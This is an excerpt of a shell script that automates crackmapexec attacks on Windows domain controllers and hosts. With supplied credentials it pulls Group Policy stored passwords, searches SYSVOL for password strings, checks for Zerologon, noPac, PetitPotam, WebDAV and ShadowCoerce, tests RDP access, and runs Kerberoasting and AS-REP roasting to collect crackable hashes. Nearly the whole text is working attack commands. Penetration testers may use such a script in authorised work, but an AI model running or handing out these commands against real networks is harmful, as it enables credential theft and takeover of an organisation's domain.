...
crackmapexec smb $3 -u $1 -p $2 -M gpp_autologin | tee dc-gpp-autologin.txt >> $LOGFILE
date >> $LOGFILE
echo 'SEARCH GPP-PASSWORD' >> $LOGFILE
echo 'Running: crackmapexec smb '$3' -u '$1' -p '$2' -M gpp_password | tee dc-gpp-password.txt'
crackmapexec smb $3 -u $1 -p $2 -M gpp_password | tee dc-gpp-password.txt >> $LOGFILE
date >> $LOGFILE
...
crackmapexec smb $3 -u $1 -p $2 --spider SYSVOL --pattern cpassword | tee dc-sysvol-pattern.txt >> $LOGFILE
date >> $LOGFILE
...
crackmapexec smb $3 -u $1 -p $2 --spider SYSVOL --pattern admin |tee -a dc-sysvol-pattern.txt >> $LOGFILE
date >> $LOGFILE
echo 'SPIDERING PWD' >> $LOGFILE
echo 'Running: crackmapexec smb '$3' -u '$1' -p '$2' --spider SYSVOL --pattern pwd | tee -a dc-sysvol-pattern.txt'
crackmapexec smb $3 -u $1 -p $2 --spider SYSVOL --pattern pwd | tee -a dc-sysvol-pattern.txt >> $LOGFILE
...
crackmapexec smb $5 -u $1 -p $2 -M zerologin | tee $1-vulns.txt
echo 'Running: crackmapexec smb '$5' -u '$1' -p '$2' -M nopac |tee -a '$1'-vulns.txt'
crackmapexec smb $5 -u $1 -p $2 -M nopac |tee -a $1-vulns.txt
echo 'Running: crackmapexec smb '$5' -u '$1' -p '$2' -M petitpotam |tee -a '$1'-vulns.txt'
crackmapexec smb $5 -u $1 -p $2 -M petitpotam |tee -a $1-vulns.txt
echo 'Running: crackmapexec smb '$5' -u '$1' -p '$2' -M webdav | tee -a '$1'-vulns.txt'
crackmapexec smb $5 -u $1 -p $2 -M webdav | tee -a $1-vulns.txt
echo 'Running: crackmapexec smb '$5' -u '$1' -p '$2' -M shadowcoerce | tee -a '$1'-vulns.txt'
crackmapexec smb $5 -u $1 -p $2 -M shadowcoerce | tee -a '$1'-vulns.txt
...
crackmapexec rdp $5 -u $1 -p $2 | tee $1-rdp.txt >> $LOGFILE
...
crackmapexec ldap $3 -u $1 -p $2 --kerberoasting kerberoasts.txt >> $LOGFILE
...
crackmapexec ldap $3 -u $1 -p $2 --asreproast asreproast.txt >> $LOGFILE
